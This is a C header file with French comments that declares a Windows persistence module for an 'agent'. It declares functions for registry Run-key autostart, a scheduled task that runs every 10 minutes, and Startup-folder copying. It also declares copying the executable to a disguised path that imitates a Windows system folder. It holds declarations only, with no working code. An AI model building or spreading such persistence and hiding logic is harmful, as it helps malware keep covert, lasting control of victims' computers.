#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#include <windows.h>
#include <shlobj.h>
// taskschd.h et comdef.h ne sont pas nécessaires (on utilise schtasks.exe via shell)

// Codes de retour
#define PERSIST_SUCCESS 0
#define PERSIST_ERROR_REGISTRY 1
#define PERSIST_ERROR_TASK 2
#define PERSIST_ERROR_STARTUP 3
#define PERSIST_ERROR_ACCESS_DENIED 4

/**
 * Structure pour gérer la persistence
 */
typedef struct {
    BOOL registry_installed;
    BOOL task_installed;
    BOOL startup_installed;
    char install_path[MAX_PATH];
    char task_name[64];
} PersistenceStatus;

/**
 * Installe la persistence via Registry Run Key
 * HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 */
int install_persistence_registry(const char *exe_path, const char *name);

/**
 * Désinstalle la persistence Registry
 */
int remove_persistence_registry(const char *name);

/**
 * Installe la persistence via Scheduled Task
 * Tâche qui s'exécute toutes les 10 minutes
 */
int install_persistence_task(const char *exe_path, const char *task_name);

/**
 * Désinstalle la Scheduled Task
 */
int remove_persistence_task(const char *task_name);

/**
 * Installe la persistence via Startup Folder
 * Copie l'exe dans %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 */
int install_persistence_startup(const char *exe_path, const char *link_name);

/**
 * Désinstalle la persistence Startup Folder
 */
int remove_persistence_startup(const char *link_name);

/**
 * Copie l'exécutable dans un emplacement discret
 * %APPDATA%\Microsoft\Windows\SystemData\agent.exe
 */
int copy_to_persistent_location(char *dest_path, size_t dest_size);

/**
 * Vérifie si l'agent est déjà installé
 */
BOOL is_already_installed();

/**
 * Installe toutes les méthodes de persistence
 */
int install_all_persistence();

/**
 * Supprime toutes les méthodes de persistence
 */
int remove_all_persistence();

/**
 * Récupère le status de la persistence
 */
void get_persistence_status(PersistenceStatus *status);

#endif // PERSISTENCE_H